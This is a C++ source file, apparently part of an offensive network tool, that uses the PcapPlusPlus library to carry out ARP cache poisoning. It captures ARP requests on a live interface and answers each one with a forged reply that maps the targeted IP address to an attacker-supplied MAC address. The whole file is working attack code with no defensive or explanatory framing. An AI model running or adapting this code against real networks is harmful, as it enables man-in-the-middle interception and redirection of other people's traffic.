#include "arp_poisoning/all_out.h"
#include "ArpLayer.h"
#include "EthLayer.h"
#include "MacAddress.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "RawPacket.h"
#include <future>
#include <stdexcept>

namespace {
struct AllOutArpPoisoningCookie {
    pcpp::MacAddress attackerMacAddress;
    std::promise<void> completionPromise;
};

constexpr int RESPONSE_PACKET_SIZE = 60;

void onPacketArrives(pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                     void *cookie) {
    auto *allOutArpPoisoningCookie =
        static_cast<AllOutArpPoisoningCookie *>(cookie);

    pcpp::Packet parsedPacket(packet);
    auto *requestEthLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
    auto *requestArpLayer = parsedPacket.getLayerOfType<pcpp::ArpLayer>();

    // determine whether or not to handle packet
    if (requestEthLayer->getSourceMac() == device->getMacAddress() ||
        requestEthLayer->getSourceMac() ==
            allOutArpPoisoningCookie->attackerMacAddress ||
        requestArpLayer->getTargetIpAddr() != device->getIPv4Address()) {
        return;
    }

    // craft response packet
    pcpp::EthLayer responseEthLayer(device->getMacAddress(),
                                    requestEthLayer->getSourceMac());

    pcpp::ArpLayer responseArpLayer(
        pcpp::ArpOpcode::ARP_REPLY,
        allOutArpPoisoningCookie->attackerMacAddress,
        requestArpLayer->getSenderMacAddress(),
        requestArpLayer->getTargetIpAddr(), requestArpLayer->getSenderIpAddr());

    pcpp::Packet responsePacket(RESPONSE_PACKET_SIZE);
    responsePacket.addLayer(&responseEthLayer);
    responsePacket.addLayer(&responseArpLayer);
    responsePacket.computeCalculateFields();

    device->sendPacket(&responsePacket);
}
} // namespace

void ATK::ARP::AllOutArpPoisoningStrategy::execute() {
    if (!device_->open()) {
        throw std::runtime_error("Unable to open device");
    }
    std::promise<void> completionPromise;
    std::future completionFuture = completionPromise.get_future();

    AllOutArpPoisoningCookie cookie{.attackerMacAddress = attackerMacAddress_,
                                    .completionPromise =
                                        std::move(completionPromise)};

    pcpp::ArpFilter arpFilter(pcpp::ArpOpcode::ARP_REQUEST);
    device_->setFilter(arpFilter);

    device_->startCapture(onPacketArrives, &cookie);

    completionFuture.wait();

    device_->close();
}
